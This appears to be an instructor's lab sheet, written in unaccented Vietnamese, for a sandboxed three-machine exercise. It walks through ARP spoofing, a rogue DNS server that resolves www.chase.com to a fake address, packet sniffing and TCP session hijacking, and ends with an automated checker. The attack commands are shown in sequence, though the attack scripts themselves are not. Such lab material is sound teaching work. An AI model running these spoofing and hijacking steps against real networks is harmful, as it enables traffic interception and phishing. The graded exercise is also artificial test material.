BAI LAB: DNS REDIRECTION + TCP HIJACKING
==========================================

BOI CANH
--------
He thong gom 3 may ao tren mang LAN 172.21.0.0/24:

  - victim   (172.21.0.2): may nan nhan, dung DNS server 172.21.0.3 va mo
                           phien TCP toi server.
  - server   (172.21.0.3): dich vu TCP echo tren cong 9999, ghi log vao
                           /var/log/session.log.
  - attacker (172.21.0.4): may cua ban, co scapy, tcpdump, script
                           arp-poison, fake-dns.py va hijack.py.

MUC TIEU
--------
1) Chuyen huong DNS cua victim sang may attacker.
2) Tra loi DNS gia (172.21.0.99) de dan victim toi dia chi gia.
3) Bat va chen goi tin vao phien TCP victim -> server.

BUOC 1 - ARP spoofing va bat dau rogue DNS
------------------------------------------
Tren attacker:

    cd ~/.local/bin
    sudo nohup ./arp-poison eth0 >/tmp/arp.log 2>&1 < /dev/null &
    disown
    sudo nohup python3 fake-dns.py >/tmp/fakedns.log 2>&1 < /dev/null &
    disown

Kiem tra tren victim:

    ip neigh | grep 172.21.0.3

Dia chi 172.21.0.3 phai tro toi MAC attacker: 02:42:ac:15:00:04.

BUOC 2 - Chuyen huong DNS cua victim
------------------------------------
Tren victim:

    sudo sh -c 'echo "nameserver 172.21.0.4" > /etc/resolv.conf'
    dig www.chase.com A +short

Ket qua phai la 172.21.0.99 (dia chi gia do attacker tra loi).

BUOC 3 - Mo phien TCP
---------------------
Tren victim:

    start-session

Go HELLO roi Enter. Giu terminal nay mo.

BUOC 4 - Sniff phien TCP
------------------------
Tren attacker:

    sudo tcpdump -Z root -U -n -w ~/session.pcap 'tcp port 9999'

Doc capture:

    sudo tcpdump -nn -r ~/session.pcap

Xac dinh SEQ, ACK va cong nguon (sport) cua victim, cung nhu do dai
payload (truong "length") cua goi tin. Vi du capture:

    seq 1000:1006, ack 2000, length 6

BUOC 5 - Chen goi tin
---------------------
Tren attacker:

    sudo python3 hijack.py 1000 2000 <sport> 6

Script se dat goi chen tai seq + 6 (tuc la ngay sau du lieu victim vua gui).

BUOC 6 - Kiem tra
-----------------
Tren server:

    sudo cat /var/log/session.log

Phai thay RECV HELLO va RECV HIJACKED.

KIEM TRA KET QUA
----------------
Tu Linux host:

    checkwork

4 checkwork:
    cw_dns_redirect    - resolv.conf cua victim tro toi attacker

    cw_tcp_session     - server da nhan du lieu HELLO
    cw_tcp_hijacked    - server da nhan du lieu HIJACKED
